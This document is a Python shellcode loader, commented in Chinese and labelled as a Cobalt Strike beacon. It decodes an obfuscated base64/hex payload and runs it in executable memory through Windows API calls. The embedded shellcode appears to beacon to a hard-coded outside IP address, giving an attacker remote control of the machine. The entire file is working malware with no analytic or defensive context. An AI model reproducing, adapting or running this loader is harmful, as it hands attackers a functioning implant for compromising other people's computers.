# -*- coding:utf-8 -*-
import ctypes
import base64

'''
EXITFUNC=thread
'''

'''
CS beacon
'''

c = 'ZmM0ODgzZTRmMGU4YzgwMDAwMDA0MTUxNDE1MDUyNTE1NjQ4MzFkMjY1NDg4YjUyNjA0ODhiNTIxODQ4OGI1MjIwNDg4YjcyNTA0ODBmYjc0YTRhNGQzMWM5NDgzMWMwYWMzYzYxN2MwMjJjMjA0MWMxYzkwZDQxMDFjMWUyZWQ1MjQxNTE0ODhiNTIyMDhiNDIzYzQ4MDFkMDY2ODE3ODE4MGIwMjc1NzI4YjgwODgwMDAwMDA0ODg1YzA3NDY3NDgwMWQwNTA4YjQ4MTg0NDhiNDAyMDQ5MDFkMGUzNTY0OGZmYzk0MThiMzQ4ODQ4MDFkNjRkMzFjOTQ4MzFjMGFjNDFjMWM5MGQ0MTAxYzEzOGUwNzVmMTRjMDM0YzI0MDg0NTM5ZDE3NWQ4NTg0NDhiNDAyNDQ5MDFkMDY2NDE4YjBjNDg0NDhiNDAxYzQ5MDFkMDQxOGIwNDg4NDgwMWQwNDE1ODQxNTg1ZTU5NWE0MTU4NDE1OTQxNWE0ODgzZWMyMDQxNTJmZmUwNTg0MTU5NWE0ODhiMTJlOTRmZmZmZmZmNWQ2YTAwNDliZTc3Njk2ZTY5NmU2NTc0MDA0MTU2NDk4OWU2NGM4OWYxNDFiYTRjNzcyNjA3ZmZkNTQ4MzFjOTQ4MzFkMjRkMzFjMDRkMzFjOTQxNTA0MTUwNDFiYTNhNTY3OWE3ZmZkNWU5OTMwMDAwMDA1YTQ4ODljMTQxYjhjZDI4MDAwMDRkMzFjOTQxNTE0MTUxNmEwMzQxNTE0MWJhNTc4OTlmYzZmZmQ1ZWI3OTViNDg4OWMxNDgzMWQyNDk4OWQ4NGQzMWM5NTI2ODAwMzJjMDg0NTI1MjQxYmFlYjU1MmUzYmZmZDU0ODg5YzY0ODgzYzM1MDZhMGE1ZjQ4ODlmMWJhMWYwMDAwMDA2YTAwNjg4MDMzMDAwMDQ5ODllMDQxYjkwNDAwMDAwMDQxYmE3NTQ2OWU4NmZmZDU0ODg5ZjE0ODg5ZGE0OWM3YzBmZmZmZmZmZjRkMzFjOTUyNTI0MWJhMmQwNjE4N2JmZmQ1ODVjMDBmODU5ZDAxMDAwMDQ4ZmZjZjBmODQ4YzAxMDAwMGViYjNlOWU0MDEwMDAwZTg4MmZmZmZmZjJmNTE3NTM1NjIwMDZiODk2YzIyOGIwOGY2ZTRjOTkwOWE3NGI1ZTBhZWMxNjAzYjQ1YzE1MDc4NTZiMDMzMGUxNjYwMmRkM2Q1OGZiOWVjNjZlMDQ1M2Q4N2E0OTZhYjg2ZDYyNmI1ODY2YjQ4YmM4ODAxNTk3Nzc0ZjBkMDEyZDc0ZTY1MjIwMTgxOTNhYTUwOGYzOTlhNWI5YWQ5MDA1NTczNjU3MjJkNDE2NzY1NmU3NDNhMjA0ZDZmN2E2OTZjNmM2MTJmMzUyZTMwMjAyODYzNmY2ZDcwNjE3NDY5NjI2YzY1M2IyMDRkNTM0OTQ1MjAzOTJlMzAzYjIwNTc2OTZlNjQ2Zjc3NzMyMDRlNTQyMDM2MmUzMTNiMjA1NzRmNTczNjM0M2IyMDU0NzI2OTY0NjU2ZTc0MmYzNTJlMzAzYjIwNGQ0MTRjNDMyOTBkMGEwMDlmOTMyOWFiMmY2NDE1ODliNjlmOTRlODExYjQ0N2IxOTJhMTAzYzgyOGM4MGQyMjJjNDZmNzIzNDA3MzU4OWNkODY2NDU1NDBjODkzYmE4NjQwMTNhYmY3MzdhMzM5NDc2M2U2ZTA5ZmE2MjhkMWEyNDVjMjkxZTljMzI2YzYyNDFlODJkNWQ2MjZhMjM4MTNlZmViZWI5NTU2OTUyNDJkZDVmMDFjMDVkODQwZTQ5Y2VhMmZiZTcwZDIzN2NiZTU0YTZiZThiMWYxOTQ0NTJmMTVkNzUzZjI3MDk1ZGZhODRhOGUwMzUxNWNiYjE0YjU4OWUwNjAyMDcxZWQ1YzU2YzRlMWZmZWUyMTJmMGVmMWRkNzMzMjU2YmQ0NWM1MWMwYTY3NGYzOGY5OWQwZTAxOWZjZmQ4YTczNGY3MzI1MjI5MDQyMzRkZWEwZWY4MTU5MjA2MjM4NGUzZjQ2ZmUwZGZlOTExOGU1N2VkYWNhMTg4NDgxZmQ0MTY3NjY2ZTIzN2FjODZiMTAyNzMwYzE0NDJlMDVmZGMzZTc0MjBiYWNjNjIxOTcwMDQxYmVmMGI1YTI1NmZmZDU0ODMxYzliYTAwMDA0MDAwNDFiODAwMTAwMDAwNDFiOTQwMDAwMDAwNDFiYTU4YTQ1M2U1ZmZkNTQ4OTM1MzUzNDg4OWU3NDg4OWYxNDg4OWRhNDFiODAwMjAwMDAwNDk4OWY5NDFiYTEyOTY4OWUyZmZkNTQ4ODNjNDIwODVjMDc0YjY2NjhiMDc0ODAxYzM4NWMwNzVkNzU4NTg1ODQ4MDUwMDAwMDAwMDUwYzNlODdmZmRmZmZmMzEzMjM4MmUzMTJlMzEzMzM1MmUzODMwMDAxMjM0NTY3OA=='
d = str(base64.b64decode(c),encoding="utf-8")
buf = bytes.fromhex(d)
e = buf
shellcode = bytearray(e)

# 设置VirtualAlloc返回类型为ctypes.c_uint64
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64

# 申请内存
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))

# 放入shellcode
buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
ctypes.windll.kernel32.RtlMoveMemory(
    ctypes.c_uint64(ptr),
    buf,
    ctypes.c_int(len(shellcode))
)
# 创建一个线程从shellcode放置位置首地址开始执行
handle = ctypes.windll.kernel32.CreateThread(
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.c_uint64(ptr),
    ctypes.c_int(0),
    ctypes.c_int(0),
    ctypes.pointer(ctypes.c_int(0))
)
# 等待上面创建的线程运行完
ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))
